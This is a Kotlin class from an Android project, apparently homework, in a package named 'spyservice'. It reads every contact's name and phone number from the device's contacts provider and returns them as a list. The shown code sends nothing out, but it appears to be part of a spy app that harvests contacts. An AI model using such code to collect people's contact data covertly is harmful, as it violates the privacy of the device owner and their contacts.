package com.homework.myapplication.spyservice

import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.Context
import android.provider.ContactsContract
import java.util.*

class GetContacts : (Context) -> (List<String>) {
    @SuppressLint("Recycle")
    override fun invoke(context: Context): List<String> {
        val contactList: ArrayList<String> = ArrayList()
        val contentResolver: ContentResolver = context.contentResolver
        val projection = arrayOf(
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        )
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            projection,
            "${ContactsContract.Contacts.HAS_PHONE_NUMBER}>0 AND LENGTH(" +
                    "${ContactsContract.CommonDataKinds.Phone.NUMBER})>0",
            null,
            ORDER
        ) ?: return emptyList()
        with(cursor) {
            while (moveToNext()) {
                val name =
                    getString(getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))
                val number =
                    getString(getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                contactList.add("$name : $number")
            }
            close()
        }
        return contactList
    }

    companion object {
        const val ORDER = "display_name ASC"
    }
}
